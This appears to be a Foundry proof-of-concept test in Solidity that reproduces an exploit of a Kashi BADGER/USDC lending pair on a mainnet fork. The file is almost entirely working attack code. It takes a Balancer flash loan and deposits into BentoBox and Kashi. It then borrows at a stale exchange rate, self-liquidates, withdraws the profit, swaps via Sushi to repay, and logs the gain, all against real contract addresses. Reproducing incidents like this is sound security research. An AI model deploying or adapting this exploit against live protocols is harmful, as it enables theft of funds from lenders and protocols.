pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "./interfaces/Cheatcodes.sol";
import "./interfaces/IERC20.sol";
import "./interfaces/IBentoBoxV1.sol";
import "./interfaces/IKashiPairMediumRiskV1.sol";
import "./interfaces/IPancakeRouter01.sol";

interface IBalancer {
    function flashLoan(address recipient, address [] memory tokens, uint256[] memory amounts, bytes memory userData) external;
}

contract Exploit {
    address KashiPairMediumRiskMasterContract = 0x2cBA6Ab6574646Badc84F0544d05059e57a5dc42;
    IERC20 BADGER = IERC20(0x3472A5A71965499acd81997a54BBA8D852C6E53d);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IBalancer BalancerVault = IBalancer(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IBentoBoxV1 BentoBox = IBentoBoxV1(0xF5BCE5077908a1b7370B9ae04AdC565EBd643966);
    IKashiPairMediumRiskV1 KashiPairMediumRisk_BADGER_USDC = IKashiPairMediumRiskV1(0xa898974410F7e7689bb626B41BC2292c6A0f5694);
    IPancakeRouter01 sushiRouter = IPancakeRouter01(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    function Start() public {
        address[] memory loanTokens = new address[](2);
        loanTokens[0] = address(BADGER);
        loanTokens[1] = address(USDC);

        uint256[] memory loanAmount = new uint256[](2);
        loanAmount[0] = 40900 ether;
        loanAmount[1] = 121904e6;
        console.log("[INFO] flashloan USDC and BADGER");
        BalancerVault.flashLoan(address(this), loanTokens, loanAmount, new bytes(0));
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        uint256 badgerBalance = BADGER.balanceOf(address(this));
        uint256 usdcBalance = USDC.balanceOf(address(this));

        console.log("[INFO] approve a KashiPairMediumRisk masterContract access to contract funds");
        BentoBox.setMasterContractApproval(
            address(this), 
            KashiPairMediumRiskMasterContract,
            true, 
            0, 
            bytes32(uint256(0)), 
            bytes32(uint256(0))
        );
        console.log("[INFO] approve tokens to BentoBox contracts");
        BADGER.approve(address(BentoBox), type(uint256).max);
        USDC.approve(address(BentoBox), type(uint256).max);

        console.log("[INFO] deposit tokens");
        BentoBox.deposit(BADGER, address(this), address(this), 0, badgerBalance);
        KashiPairMediumRisk_BADGER_USDC.addCollateral(address(this), false, badgerBalance);

        BentoBox.deposit(USDC, address(this), address(this), 0, 112529000000);
        KashiPairMediumRisk_BADGER_USDC.addAsset(address(this), false, 112529000000);
        
        console.log("[WARNING] the exchangeRate when borrowing:", KashiPairMediumRisk_BADGER_USDC.exchangeRate());
        KashiPairMediumRisk_BADGER_USDC.borrow(address(this), 121904280000);
        

        address[] memory users = new address[](1);
        users[0] = address(this);
        uint256[] memory maxBorrowParts = new uint256[](1);
        maxBorrowParts[0] = 101363082522;
        KashiPairMediumRisk_BADGER_USDC.liquidate(users, maxBorrowParts, address(this), address(0), true);
        console.log("[WARNING] the exchangeRate when liquidate:", KashiPairMediumRisk_BADGER_USDC.exchangeRate());

        console.log("[INFO] withdraw of attack profits");
        KashiPairMediumRisk_BADGER_USDC.removeAsset(address(this), 107220361964);

        BentoBox.withdraw(USDC, address(this), address(this), 0, BentoBox.balanceOf(USDC, address(this)));
        BentoBox.withdraw(BADGER, address(this), address(this), 0, BentoBox.balanceOf(BADGER, address(this)));
        
        console.log("[INFO] swap USDC to BADGER ,make up the difference between the flashloan amount");
        uint256 swapAmount = 40900 ether - BADGER.balanceOf(address(this));
        address[] memory swapPath = new address[](4);
        swapPath[0] = address(USDC);
        swapPath[1] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; //WETH
        swapPath[2] = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599; //WBTC
        swapPath[3] = address(BADGER);
        
        USDC.approve(address(sushiRouter), type(uint256).max);
        sushiRouter.swapTokensForExactTokens(swapAmount, type(uint256).max, swapPath, address(this), block.timestamp);
        
        console.log("[INFO] repay flashloan");
        USDC.transfer(address(BalancerVault), 121904e6);
        BADGER.transfer(address(BalancerVault), 40900 ether);
    }
}


contract test is DSTest{
    Exploit internal exploit;
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    
    function setUp() public {
        cheats.createSelectFork("mainnet", 15928594);
    }

    function testExploit() public {
        exploit = new Exploit();
        exploit.Start();
        verify();
    }
    function verify() public {
        emit log_named_decimal_uint("[INFO] profit after the attack, $USDC", USDC.balanceOf(address(exploit)), 6);
    }
}